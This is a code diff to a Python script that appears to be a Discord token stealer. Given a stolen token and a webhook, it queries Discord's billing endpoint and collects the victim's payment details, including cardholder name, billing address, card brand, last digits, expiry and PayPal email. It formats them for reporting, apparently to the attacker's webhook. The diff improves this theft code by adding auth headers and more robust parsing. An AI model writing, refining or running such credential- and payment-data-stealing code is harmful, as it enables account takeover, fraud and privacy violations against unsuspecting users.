@@ -170,7 +170,10 @@ def get_orbs(token):
         return '0'
 def printtk(webhook, token):
     v = verify(token)
-    
+    headers = {
+    'authorization': token,
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
+    }
     if v:
         userinfo = v
         orbs = get_orbs(token)
@@ -185,24 +188,24 @@ def printtk(webhook, token):
         locale = userinfo.get('locale')
         pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"
         billing_fields = []
-        cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}
+        cc_digits = {"Visa": "4", "Mastercard": "5", "Amex": "3", "Discover": "6"}
             
         try:
             billing_req = requests.get(
                 'https://discord.com/api/v6/users/@me/billing/payment-sources',
                 headers=headers,
             )
-
-            if billing_req.status_code == 200 and isinstance(billing_req.json(), list) and billing_req.json():
-                for x in billing_req.json():
+            data = billing_req.json()
+            if billing_req.status_code == 200 and isinstance(data, list) and data:
+                for x in data:
                     y = x['billing_address']
                     name = y['name']
-                    address_1 = y['line_1']
-                    address_2 = y.get('line_2', '')
-                    city = y['city']
-                    postal_code = y['postal_code']
-                    state = y.get('state', '')
-                    country = y['country']
+                    address_1 = y.get('line_1', 'None')
+                    address_2 = y.get('line_2', 'None')
+                    city = y.get('city', 'None')
+                    postal_code = y.get('postal_code', 'None')
+                    state = y.get('state', 'None')
+                    country = y.get('country', 'None')
 
                     if x['type'] == 1:
                         cc_brand = x['brand']
@@ -211,11 +214,7 @@ def printtk(webhook, token):
                         cc_month = str(x['expires_month']).zfill(2)
                         cc_year = str(x['expires_year'])
 
-                        cc_number = ''.join(
-                            z if (i + 1) % 2 else z + ' '
-                            for i, z in enumerate(cc_first + ('*' * 11) + cc_last)
-                        )
-
+                        cc_number = ' '.join((cc_first + ('*' * 11) + cc_last)[i:i+4] for i in range(0, 16, 4))
                         value = (
                             f"💳 **Credit Card**\n"
                             f"• Holder: `{name}`\n"
@@ -234,7 +233,7 @@ def printtk(webhook, token):
                         value = (
                             f"🅿️ **PayPal**\n"
                             f"• Name: `{name}`\n"
-                            f"• Email: `{x['email']}`\n"
+                            f"• Email: `{x.get('email', 'None')}`\n"
                             f"• Address: `{address_1} {address_2}`\n"
                             f"• City/State: `{city}, {state}`\n"
                             f"• Country: `{country}`\n"
@@ -249,13 +248,15 @@ def printtk(webhook, token):
                         "inline": False
                     })
             else:
+                print(billing_req.status_code)
                 billing_fields.append({
                     "name": "💰 Billing Info",
                     "value": "`None`",
                     "inline": False
                 })
 
-        except Exception:
+        except Exception as e:
+            print(e)
             billing_fields.append({
                 "name": "💰 Billing Info",
                 "value": "`None`",
